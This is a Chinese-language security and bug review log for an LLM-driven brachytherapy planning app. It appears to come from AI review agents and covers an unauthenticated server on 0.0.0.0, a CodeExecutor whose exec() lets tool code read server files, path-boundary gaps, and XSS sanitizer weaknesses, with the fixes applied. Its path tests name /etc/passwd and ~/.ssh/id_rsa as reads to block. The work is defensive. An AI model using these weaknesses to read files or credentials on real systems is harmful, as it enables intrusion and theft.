| U-60 | memory/user_profile.py | 96-114 | **save() 非原子写入** — 崩溃时文件截断。 |
| U-61 | memory/preference_store.py | 220-221 | **default=str 静默转换** — 非序列化类型变为字符串。 |
| U-62 | memory/preference_store.py | 208-209 | **KeyError 吞噬** — 异常时整个偏好文件重置为空。 |
| U-63 | skills/markdown_loader.py | 154-164 | **全局 Loader 线程不安全** — 懒初始化无锁。 |
| U-64 | skills/markdown_loader.py | 96-97 | **YAML 标量 triggers** — 字符串 triggers 会被逐字符迭代。 |
| U-65 | skills/markdown_loader.py | 118 | **BOM 未处理** — UTF-8 BOM 导致 frontmatter 正则不匹配。 |
| U-66 | scripts/nnunet_infer.py | 1-7 | **无输入验证/错误处理** — nnunetv2 未安装时 ImportError 无友好提示。 |
| U-67 | scripts/nnunet_infer.py | 2 | **脆弱的参数解析** — `"-m" in sys.argv` 匹配任何含 -m 的参数。 |
| U-68 | web/app/index.html | 5367-5370 | **escHtml 未转义单引号** — 在单引号属性中可能逃逸。 |
| U-69 | brain/providers/openrouter_llm.py | 112-129 | **客户端非懒加载** — __init__ 中创建，API key 无效时构造失败。 |
| U-70 | brain/providers/mini_max_llm.py | 62-102 | **_chat 可返回 None** — max_retries=0 时无 return 语句。 |

---

### 第六轮问题统计

| 严重度 | 数量 | 关键发现 |
|--------|------|----------|
| 🔴 Critical | 3 | 质量门永远不拒绝、Provider 格式不一致(14文件)、MiniMax NameError |
| 🟠 High | 14 | 消息总线(4)、Provider bug(6)、质量门(2)、XSS(1)、decider(1) |
| 🟡 Medium | 34 | 消息总线(4)、Provider(5)、brain/knowledge(3)、brain/execution(3)、brain/deciders(2)、memory(6)、skills(4)、frontend(4)、config(2)、quality(1) |
| 🔵 Low | 19 | Provider(3)、memory(5)、skills(4)、frontend(2)、scripts(2)、其他(3) |
| **总计** | **70** | |

### 第六轮核实矩阵（Top 15）

| # | 问题 | 核实结果 | 动作 |
|---|------|----------|------|
| U-01 | 质量门永远不拒绝 | ✅ 确认 — APPEND-ONLY 模式，passed 始终 True | 🔴 待修复 |
| U-02 | Provider tool call 格式不一致 | ✅ 确认 — 14 文件两种格式 | 🔴 待修复 |
| U-03 | MiniMax NameError | ✅ 确认 — openai 作用域问题 | 🔴 待修复 |
| U-04 | `List[any]` 类型错误 | ✅ 确认 — Python 3.9+ TypeError | 🟠 待修复 |
| U-05 | message_bus _history 泄漏 | ✅ 确认 — 无 TTL | 🟠 待修复 |
| U-06 | 重复 Handler 调用 | ✅ 确认 — 无去重 | 🟠 待修复 |
| U-07 | 废弃 asyncio API | ✅ 确认 — 3.12+ RuntimeError | 🟠 待修复 |
| U-08 | 无 Agent = 自动通过 | ✅ 确认 — fail-open 设计 | 🟠 待修复 |
| U-15 | XSS sanitizer 不完整 | ✅ 确认 — data:/onerror 未过滤 | 🟠 待修复 |
| U-32 | 中文 Token 估算偏差 | ✅ 确认 — //4 对中文严重不准 | 🟡 待修复 |
| U-34 | 大小写敏感匹配 | ✅ 确认 — "CNN" != "cnn" | 🟡 待修复 |
| U-38 | 引用不存在的工具 | ✅ 确认 — seed_planning_rl 不存在 | 🟡 待修复 |
| U-39 | 触发词 "complex" 过宽 | ✅ 确认 — 医疗常见词 | 🟡 待修复 |
| U-45 | 剂量单位不明 | ✅ 确认 — 0-255 归一化未文档化 | 🟡 待修复 |
| U-46 | 相对路径模型 | ✅ 确认 — 依赖 CWD | 🟡 待修复 |

---

### 六轮累计统计

| 轮次 | Critical | High | Medium | Low | 总计 |
|------|----------|------|--------|-----|------|
| 第一轮 | 12 | 18 | 24 | 15 | 69 |
| 第二轮 | 8 | 14 | 14 | 2 | 38 |
| 第三轮 | 6 | 16 | 18 | 12 | 52 |
| 第四轮 | — | — | — | — | (修复轮) |
| 第五轮 | 2 | 5 | 5 | 3 | 15 |
| 第六轮 | 3 | 14 | 34 | 19 | 70 |
| **累计** | **31** | **67** | **95** | **51** | **244** |
| 已修复 | 28+15 | 5+12 | 3+4 | 0 | **36+31=67** |
| 待修复 | 16 | 50 | 88 | 51 | **177** |

---

### 第五/六轮修复记录 (2026-06-28)

> 逐一验证每个问题，确认是真 bug 后修复。共验证 25 个问题，修复 18 个，跳过 7 个。

#### 已修复 (18 个)

| # | 问题 | 文件 | 修复内容 |
|---|------|------|----------|
| U-04 | `List[any]` 类型错误 | communication/message_bus.py:50 | `List[any]` → `List[Any]` |
| U-05 | _history 无界增长 | communication/message_bus.py:28-32 | 添加 `max_history=1000` + 超限驱逐 |
| U-07 | 废弃 asyncio API | communication/message_bus.py:103 | `get_event_loop()` → `get_running_loop()` |
| U-09 | OpenAI max_retries 未使用 | brain/providers/openai_llm.py:82 | 传递 `max_retries` 给 OpenAI 客户端 |
| U-10 | Anthropic streaming fallback 类型 | brain/providers/anthropic_llm.py:368 | 移除裸字符串 yield，统一为 dict |
| U-11 | LocalLLM 双 /v1 | brain/providers/local_llm.py:18,41 | base_url 默认值去掉 `/v1`，models 端点修正 |
| U-13 | QualityDecider 满分 80 | brain/deciders/quality_decider.py:21,111 | 文档修正 0-80，阈值 >=80→>=65 |
| U-16 | kwargs 覆盖 (8 providers) | brain/providers/*.py | 8 个 Provider 重排 update 顺序 |
| U-17 | latency_ms=0 (8 providers) | brain/providers/*.py | 8 个 Provider 添加实际延迟测量 |
| U-32 | 中文 Token 估算 | memory/smart_context.py:169-171 | CJK 字符按 1 token/字符估算 |
| U-34 | 大小写敏感匹配 | memory/user_profile.py:191 | 关键词列表统一小写 |
| U-35 | 部分 lower() 缺失 | memory/user_profile.py:163-168 | 统一添加 `.lower()` |
| U-39 | 触发词 "complex" 过宽 | skills/markdown/rl_planning.md:8 | 移除 "complex"，添加 "rl planning" |
| U-45 | 剂量单位不明 | config/default_params.json:7 | 添加单位注释 (normalized 0-255) |
| U-46 | 相对路径模型 | tool_factory/dose_engine/cnn_dose_engine.py:147 | 解析到项目根目录 |
| U-50 | ui_knowledge 复制粘贴 | brain/knowledge/ui_knowledge.json:265 | 'segment' or 'segmentation' |
| V-20 | os 在 ALLOWED_MODULES | tool_factory/code_executor/__init__.py:30 | 添加 os.remove/os.rmdir 到危险模式 |
| V-23 | /home 路径范围过大 | web/server.py:167 | `/home` → `os.path.expanduser("~")` |

#### 跳过 (7 个 — 非真 bug 或有意设计)

| # | 问题 | 原因 |
|---|------|------|
| U-01 | 质量门永远不拒绝 | **有意设计** — APPEND-ONLY MODE，注释明确 |
| U-02 | Provider 格式不一致 | **非 bug** — 消费者已处理两种格式 |
| U-03 | MiniMax NameError | **潜在缺陷** — openai 已在 requirements.txt，不会缺 |
| U-08 | 无 Agent = 自动通过 | **有意设计** — 与 APPEND-ONLY 模式一致 |
| U-12 | OpenRouter arguments | **非 bug** — 消费者处理 string/dict 两种 |
| U-38/U-40 | 引用不存在工具 | **误报** — 两个工具都存在 |
| V-14 | _global_agent | **架构设计** — web 已有 fallback，修改需大规模重构 |

---

### 六轮最高优先级修复路线图（更新）

| 优先级 | 问题 | 修复方案 | 状态 |
|--------|------|----------|------|
| **P0** | 无 pyproject.toml (V-11) | 创建 pyproject.toml | 待修复 |
| **P0** | sys.path 滥用 (V-09) | 配合 pyproject.toml 清理 | 待修复 |
| **P1** | XSS sanitizer (U-15) | 补充 data:/onerror/无空格事件处理 | 待修复 |
| **P2** | Docker 化 (T3-21) | Dockerfile + docker-compose | 待修复 |
| **P2** | 前端模块化 (H-02) | 拆分 index.html | 待修复 |

---

**第六轮审查完成时间**: 2026-06-28  
**审查人**: MiMo Code Agent (3 并行 Agent)  
**审查覆盖**: 40+ 文件 / ~12000 行 / 之前未深度覆盖的模块  
**累计审查**: 6 轮 / 244 个问题 / 67 个已修复 / 177 个待修复  
**第五/六轮修复**: 验证 25 个问题，修复 18 个，跳过 7 个

---

## 第七轮：CodeGraph 全局审查与架构校准 (2026-06-28)

> 本轮按用户要求使用项目现有 CodeGraph 数据库 `.codegraph/codegraph.db` 建立全局理解，并用 AST/源码抽样交叉验证。重点不是重复前六轮的逐文件列表，而是从调用图、入口点、状态边界和当前工作树改动中确认真实高风险问题。

### 审查输入与可信度

| 数据源 | 结果 | 说明 |
|--------|------|------|
| `.codegraph/codegraph.db` | 289 files / 6022 nodes / 10498 edges | 覆盖核心 Python/JS 文件，适合做架构热点定位 |
| CodeGraph nodes | import 1696 / variable 1570 / method 1232 / function 928 / class 260 / route 47 | Flask route、类、方法和调用边已被索引 |
| CodeGraph edges | contains 5690 / calls 3489 / imports 620 / instantiates 548 | 足以识别高耦合模块和跨模块依赖 |
| AST route scan | `web/server.py` 共 47 个 route | 逐个提取 decorator，验证鉴权/限流覆盖 |
| AST/source scan | 1515 个 `.py` 文件扫描，发现后再过滤到应用代码 | 避免把 venv/vendor 噪声计入真实问题 |
| CodeGraph daemon | 多次 `ENOSPC: System limit for number of file watchers reached` | 图快照可用，但增量同步存在遗漏风险 |

### CodeGraph 全局架构理解

```mermaid
graph TD
    UI["web/app/index.html\n单页前端 + viewer + report"] --> API["web/server.py\n47 Flask routes / session manager / SSE"]
    API --> Agent["AgenticSys.py\nBrachyAgent / AgentMemory / function calling"]
    Agent --> Tools["tool_factory/*\nsegmentation / planning / executor / export"]
    Agent --> Brain["brain/*\nLLM providers / deciders / RAG / execution"]
    Agent --> Memory["memory/*\nconversation / preference / smart context"]
    Tools --> Plans["plans/*\ngeometry / dose / device manager"]
    Tools --> External["TotalSegmentator / nnUNet / dose model / web APIs"]
    API --> Outputs["uploads / outputs / screenshots / report export"]
```

核心运行链路可以概括为：

1. `web/server.py` 是唯一主要 HTTP 边界，负责上传、影像加载、viewer 切片/体数据、规划步骤、chat、导出和状态查询。
2. `AgenticSys.py` 是系统内核，持有 `AgentMemory`、工具注册表、LLM function-calling 循环和全局 `_global_agent` 兼容层。
3. `tool_factory/seed_plan/planning_pipeline.py` 是治疗计划主流水线，依赖 CT、CTV、OAR、device manager 和 dose/evaluation 组件。
4. `tool_factory/OAR_seg/totalsegmentator_oar.py`、`tool_factory/CTV_seg/*`、`plans/*` 组成影像/分割/剂量计算路径，是临床正确性最高风险区域。
5. `brain/providers/*`、`memory/*`、`skills/*` 影响 LLM 行为和工具选择，但最终安全边界仍落在 server route、tool executor 和文件系统访问控制上。

### CodeGraph 热点文件

| 排名 | 文件 | 图证据 | 风险含义 |
|------|------|--------|----------|
| 1 | `AgenticSys.py` | out edges 978 / in edges 1103 / unresolved refs 1691 | 系统核心，状态、工具调用、LLM 行为高度集中 |
| 2 | `web/server.py` | 160 nodes / 47 routes / unresolved refs 1518 | 外部攻击面和状态入口高度集中 |
| 3 | `tool_factory/seed_plan/planning_pipeline.py` | out edges 260 / 52 nodes | 规划主链路，当前工作树存在逻辑回归 |
| 4 | `plans/utilizations.py` | 94 nodes / out edges 237 | 剂量/几何工具函数复杂度高 |
| 5 | `tool_factory/web_search/__init__.py` | 87 nodes / in/out edges ~200 | 网络访问和证据链复杂度高 |
| 6 | `tool_factory/env_manager/__init__.py` | out edges 102 | LLM 可触发环境/包管理，安全边界敏感 |

---

### Critical — 本轮新增/重新确认

| # | 文件 | 行号 | 问题 |
|---|------|------|------|
| CG-01 | `web/server.py` | 34-39, 177-188, 3764-3775 | **默认外网监听 + 默认关闭 API key 鉴权**。CLI 默认 `--host 0.0.0.0`，而 `require_api_key` 只有设置 `BRACHYBOT_API_KEY` 时才真正生效；未设置时所有带 decorator 的接口也不会校验 key。CORS 不能替代鉴权，非浏览器客户端可直接调用。 |
| CG-02 | `start_server.sh` | 7-9 | **启动脚本明文写入第三方 LLM API key**。该文件当前是 untracked，但位于项目根目录，极易被提交、截图、日志复制或 shell history 泄露。报告中已脱敏，必须轮换该 key。 |
| CG-03 | `tool_factory/code_executor/__init__.py` | 23-35, 83-126 | **CodeExecutor 不是有效沙箱**。`ALLOWED_MODULES` 包含 `os/sys/pathlib`，`safe_builtins` 暴露 `__import__`，最终在同进程 `exec()` 运行。已用无敏感文件 `/etc/hostname` 复现：工具代码可读取服务器文件。另无真实超时/内存/CPU 隔离。 |

### High — 本轮新增/重新确认

| # | 文件 | 行号 | 问题 |
|---|------|------|------|
| CG-04 | `web/server.py` | 295-386, 3575-3606 | **上传和截图写入接口无鉴权、无限流、文件类型校验不足**。`/api/upload` 保存任意文件名后缀，`/api/screenshot` 接受任意 base64 并写入磁盘；仅有全局 500MB request 上限，不限制文件数量、累计容量或 MIME/content。 |
| CG-05 | `web/server.py` | 142-174, 583-598, 950-985, 3171-3219, 3447-3451 | **路径边界过宽且应用不一致**。`_validate_path()` allowlist 包含整个项目根和当前用户 home；`api_header_info`、`api_viewer_load` 直接读取用户提交的 `ct_path`，未调用 `_validate_path()`；`api_export_dicom_rt`、`api_export_stl` 直接 `os.makedirs(output_dir)`。这会把“只读/只写 uploads、outputs”的安全假设扩大到整个 home。 |
| CG-06 | `web/server.py` | 2979-3001 | **`/api/config` POST 可无鉴权修改规划参数**。该接口没有 `@require_api_key` 和 `@rate_limit`，会直接覆盖 `agent.config` 中 seed、dose、RL、distance 等核心规划参数。若服务按默认 `0.0.0.0` 暴露，任何可达客户端都能影响后续计划。 |
| CG-07 | `tool_factory/seed_plan/planning_pipeline.py` | 614-620 | **OAR auto-recovery 分支不可达**。当前工作树新增 `if oar_mask is None: return ...`，紧接着 line 620 又判断同一条件并尝试自动运行 OAR segmentation；后者永远不会执行，破坏原有 auto-recovery 行为。 |
| CG-08 | `tool_factory/OAR_seg/totalsegmentator_oar.py` | 316-326 | **CPU fallback 被错误映射成 GPU**。当前改动中 `_dev.startswith("cuda:")` 之外的所有情况都设置 `device_str = "gpu"`；当 device manager 返回 `cpu` 时仍会执行 `TotalSegmentator --device gpu`，在无可用 GPU 或 GPU 被禁用时失败。 |

### Medium — 本轮新增/重新确认

| # | 文件 | 行号 | 问题 |
|---|------|------|------|
| CG-09 | `web/server.py`, `AgenticSys.py` | `web/server.py:227-266, 3756`; `AgenticSys.py:168-172, 391-404` | **Flask threaded=True 下 session/agent memory 缺少锁**。`_sessions`、`_session_timestamps`、`planning_results`、`conversation`、`_ui_state` 都会在多请求线程中读写；长耗时分割/规划与前端轮询并发时可能出现状态撕裂、旧病人数据串用或 conversation 丢失。 |
| CG-10 | `web/server.py` | 45-95, 3351-3367 | **TaskManager/SSE 不是持续流且任务无 TTL**。`/api/tasks/stream` 只输出当前任务快照后结束，没有 heartbeat/阻塞等待；`_tasks` 只增不删，任务列表还无鉴权暴露。 |
| CG-11 | `web/app/index.html` | 6168-6181, 6968-6976, 17643-17648 | **前端 XSS 风险应从“完全未过滤”修正为“自写 sanitizer 不足 + 局部未转义”**。LLM markdown 经过 `_sanitizeHtml()`，但正则 sanitizer 不是 DOMPurify；DVH tooltip 仍将 `traceName` 直接拼入 `innerHTML`。 |
| CG-12 | `.codegraph/daemon.log` | tail | **CodeGraph 增量同步受 inotify watcher 上限影响**。日志反复出现 `ENOSPC: System limit for number of file watchers reached`，尤其在大量 generated evidence/json 文件下。当前 DB 可用于本轮分析，但后续依赖 CodeGraph 做“已同步最新代码”判断前，应先修复 watcher/exclude 配置。 |

---

### 对前六轮结论的校准

| 旧结论 | 本轮校准 |
|--------|----------|
| CORS 配置待核实 | 已核实：CORS 默认限制 localhost origins，但服务 CLI 默认监听 `0.0.0.0`，CORS 不能替代 API 鉴权。 |
| `/api/status` 暴露待核实 | 已核实：`/api/status` 和 `/api/device/status` 无鉴权，会暴露 brain/provider/device 状态；单独看不是 P0，但与默认无鉴权/外网监听组合后风险升高。 |
| LLM 工具无权限为有意设计 | 设计意图可保留，但 `code_executor` 当前宣传为 sandboxed，实际同进程读文件、无资源隔离；应修正文档或实现真沙箱。 |
| `/home` 路径范围已修复 | 当前是 `os.path.expanduser("~")`，仍等价允许整个 `/home/lht`。对医学数据读取可以讨论，对导出写路径和任意文件读取接口仍过宽。 |
| H-10 SSE 无心跳待核实 | 已核实：`/api/tasks/stream` 只 emit 快照后结束，不是持续任务事件流；`/api/chat` 流式响应有 keep-alive header，但没有应用层 heartbeat。 |

### 修复优先级建议

| 优先级 | 问题 | 建议修复 |
|--------|------|----------|
| P0 | CG-02 明文 API key | 立即轮换 key；从 `start_server.sh` 删除；改用 shell 环境或 `.env` 且 `.gitignore`；清理 shell history/日志中泄露副本。 |
| P0 | CG-01 默认无鉴权外网服务 | `main()` 默认 host 改回 `127.0.0.1`；只要 host 非 loopback 就强制要求 `BRACHYBOT_API_KEY`；所有 POST/导出/上传/viewer 数据接口统一加鉴权。 |
| P0 | CG-03 CodeExecutor 沙箱失效 | 短期禁用或仅本地开发启用；移除 `os/sys/pathlib/__import__`；长期改为子进程/container + uid 隔离 + seccomp/ulimit + wall-clock timeout。 |
| P1 | CG-05 路径边界 | 实现 `safe_join(base, user_path)`；读路径限制到 `uploads/` 和显式配置的数据目录；写路径限制到 `outputs/`；禁止 symlink escape。 |
| P1 | CG-04 上传/截图 | 加 `@require_api_key`、`@rate_limit`、扩展名+magic bytes 校验、文件数量/累计容量限制、图片解码尺寸限制。 |
| P1 | CG-07/CG-08 当前工作树回归 | 修正 unreachable OAR auto-recovery；CPU 时传 `--device cpu`，CUDA 时再传具体 `gpu:N`。 |
| P2 | CG-09 并发状态 | 为每个 session/agent 加 `RLock`；长任务状态和 memory 更新走单线程队列或事务式 snapshot。 |
| P2 | CG-11 前端 sanitizer | 引入 DOMPurify；所有非固定模板数据都用 `textContent` 或 `escHtml`；tooltip traceName 必须转义。 |
| P2 | CG-12 CodeGraph 同步 | 排除 `uploads/`、`outputs/`、`memory/data/`、`tool_factory/web_search/evidence/`、venv；必要时提高 `fs.inotify.max_user_watches`。 |

### 第七轮问题统计

| 严重度 | 数量 | 关键发现 |
|--------|------|----------|
| Critical | 3 | 默认外网无鉴权、明文 API key、CodeExecutor 沙箱失效 |
| High | 5 | 上传/截图写入、路径边界、配置篡改、planning_pipeline 回归、OAR device 回归 |
| Medium | 4 | 多线程状态竞态、TaskManager/SSE、前端 sanitizer、CodeGraph 同步可靠性 |
| **总计** | **12** | |

**第七轮审查完成时间**: 2026-06-28
**审查人**: Codex CodeGraph Review
**审查覆盖**: CodeGraph DB + AST route scan + 高风险入口源码核验 + 当前工作树 diff
**累计审查**: 7 轮 / 在前六轮基础上新增或重新确认 12 个问题

---

## 第七轮修复记录 (2026-06-28)

> 修复原则：逐项复核是否真实存在、是否属于有意设计；仅对确认存在且会扩大安全/正确性风险的问题做代码修复。对保留的能力改为显式启用或安全默认。

### 逐项复核与修复状态

| # | 复核结论 | 修复内容 | 验证 |
|---|----------|----------|------|
| CG-01 | 确认真问题。默认 `0.0.0.0` + 未配置 key 时鉴权 decorator 失效不是安全默认。 | `web/server.py` 默认 host 改为 `127.0.0.1`；非 loopback 监听在未设置 `BRACHYBOT_API_KEY` 时 fail-closed，除非显式设置 `BRACHYBOT_ALLOW_INSECURE_REMOTE=1`；补齐高风险 API 的 `@require_api_key`/`@rate_limit`。 | Flask test client 验证 `/api/config` 无 key 返回 401、有 key 返回 200；`run_server(host="0.0.0.0")` 无 key 被拒绝。 |
| CG-02 | 确认真问题。启动脚本明文 key 没有必要且极易泄漏。 | `start_server.sh` 删除第三方 LLM key，改为只读取 shell 环境变量；默认只监听 `127.0.0.1`；远程监听无 `BRACHYBOT_API_KEY` 时退出；`start_server.sh` 加入 `.gitignore`。 | `bash -n start_server.sh` 通过；grep 检查未再出现 token 样式密钥或 assignment 模板。仍建议立即轮换曾经暴露过的 key。 |
| CG-03 | 确认真问题。现有 `exec()` 不能称为沙箱。 | `code_executor` 默认禁用，必须设置 `BRACHYBOT_ENABLE_CODE_EXECUTOR=1` 才可运行；移除 `os/sys/pathlib/io` 等高风险模块；自定义 `__import__` 白名单；加强危险模式拦截；文档描述改为 restricted execution。 | 远端执行 `CodeExecutorTool()._execute(...)` 默认返回 `code_executor is disabled`；`py_compile` 通过。 |
| CG-04 | 确认真问题。上传/截图属于写入面，应鉴权并限制内容。 | `/api/upload`、`/api/screenshot` 加鉴权和限流；上传限制文件数量和允许扩展名；截图仅接受 PNG data URL 或 PNG bytes，限制大小并校验 PNG 魔数。 | 静态检查确认 auth/限流和 PNG decoder 存在；`git diff --check` 通过。 |
| CG-05 | 确认真问题。原 allowlist 把读写边界扩大到项目根和 home。 | 拆分 read/write roots；默认读取仅允许 uploads、`/tmp`、`/data` 和显式 `BRACHYBOT_DATA_ROOTS`；默认写入仅允许 output/outputs/screenshots、`/tmp` 和显式 `BRACHYBOT_OUTPUT_ROOTS`；`ct_path`、viewer load、导出路径统一走校验。 | 路径测试确认 `/etc/passwd`、`~/.ssh/id_rsa`、`/etc/brachybot-report.json` 被拒绝，uploads 可读，`./output/report.json` 解析到项目输出目录。 |
| CG-06 | 确认真问题。`/api/config` 可影响计划参数，不能无鉴权 POST。 | `/api/config` GET/POST 补齐 `@require_api_key` 和 `@rate_limit`。 | Flask test client 验证无 key 401、有 key 200。 |
| CG-07 | 确认真问题。当前工作树中的 OAR 早退会让 auto-recovery 不可达。 | 移除 `oar_mask is None` 的直接失败返回，保留 CTV 缺失的显式失败；OAR 缺失时重新进入原 auto-recovery 分支。 | 静态检查确认没有 OAR direct early return，且 `oar_segmentation` auto-recovery 调用仍存在。 |
| CG-08 | 确认真问题。CPU fallback 映射到 GPU 会导致无 GPU 或禁用 GPU 时失败。 | `cuda:N` 映射为 `gpu:N`，裸 `cuda` 映射为 `gpu`，其他设备映射为 `cpu`。 | 静态检查确认 `cuda` 和 `cpu` 分支均存在。 |
| CG-09 | 确认真问题。`threaded=True` 下 session/memory 多线程读写没有一致性保护。 | `web/server.py` 为 session map 增加 `RLock`；`AgenticSys.AgentMemory` 增加 `RLock`，对 store/retrieve/conversation/ui_state/export/clear/compact 等读写加锁或快照。 | `AgenticSys.py` 与 `web/server.py` 通过 `py_compile`；相关路由导入和 Flask client 验证通过。 |
| CG-10 | 确认真问题。任务状态无 TTL 且 SSE 只是快照。 | `TaskManager` 增加 TTL、最大任务数、created/updated 时间和快照返回；`/api/tasks/stream` 改为短期持续流，发送变更事件和 heartbeat，并补充缓存禁用 header。 | 静态检查和 `git diff --check` 通过。 |
| CG-11 | 确认真问题，但范围校准为自研 sanitizer 不足和局部未转义。 | 前端增加 `/api/*` fetch wrapper，可通过 `window.setBrachyBotApiKey(key)` 附加 `X-API-Key`；强化 `_sanitizeHtml()` 对危险标签、事件处理器、`href/src/xlink:href` 协议和 inline style payload 的过滤；DVH tooltip 对 `traceName` 和颜色做转义/校验。 | 静态检查确认 API key wrapper、`escHtml(traceName)`、URL/style sanitizer 存在。长期仍建议引入 DOMPurify 处理任意 HTML。 |
| CG-12 | 确认真问题。生成文件和大目录会放大 CodeGraph watcher 压力。 | 新增 `.codegraphignore` 排除 `.codegraph/`、uploads/output/outputs/screenshots/test_screenshots、memory/data、web_search evidence/cache、case_memory cases、venv 和医学影像大文件；`.gitignore` 同步排除生成目录。 | `.codegraphignore` 纳入工作树；后续需重启或重新索引 CodeGraph 以应用新的 exclude 配置。 |

### 本轮验证记录

- 语法检查：`python -m py_compile web/server.py AgenticSys.py tool_factory/code_executor/__init__.py tool_factory/seed_plan/planning_pipeline.py tool_factory/OAR_seg/totalsegmentator_oar.py`
- 安全默认：`code_executor` 默认禁用；远程监听无 `BRACHYBOT_API_KEY` 时 fail-closed。
- 鉴权回归：`/api/config` 在设置 `BRACHYBOT_API_KEY` 后，无 `X-API-Key` 返回 401，有正确 key 返回 200。
- 路径边界：确认敏感系统路径和 home 私钥路径被拒绝，uploads 读路径和项目 output 写路径按预期允许。
- 静态回归：确认 OAR auto-recovery 可达、TotalSegmentator CPU/CUDA 设备映射正确、前端 API key wrapper 与 tooltip 转义存在、启动脚本无明文 key。
- Diff 检查：`git diff --check` 对本轮修改文件通过。

### 剩余注意事项

1. CG-02 的历史明文 key 必须轮换；本轮只能移除当前工作树中的明文，不能撤销已经可能发生的泄漏。
2. 如需外网访问 BrachyBot，必须显式设置 `BRACHYBOT_API_KEY` 并让前端通过 `window.setBrachyBotApiKey(...)` 写入本地 key；默认启动只面向本机 loopback。
3. `code_executor` 现在是默认禁用的受限执行器，不是真正容器沙箱；若业务确需启用，仍建议后续改为子进程/container、低权限用户、资源限制和 wall-clock timeout。
4. CodeGraph 的 watcher/exclude 配置需要 daemon 重启或重新索引后才会完全生效。
